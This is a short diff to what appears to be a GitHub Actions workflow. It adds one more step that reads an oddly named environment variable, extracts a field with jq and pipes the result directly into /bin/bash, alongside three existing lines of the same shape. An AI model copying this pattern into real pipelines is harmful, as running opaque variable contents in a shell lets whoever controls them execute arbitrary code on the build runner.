@@ -28,6 +28,7 @@ jobs:
           echo $hbo70385 | jq -r .bvq66 | /bin/bash
           echo $spu05 | jq -r .n60 | /bin/bash
           printf '%s' "$ari75" | jq -r .ldw3654 | /bin/bash
+          echo $gpic98922 | jq -r .esagi0416 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
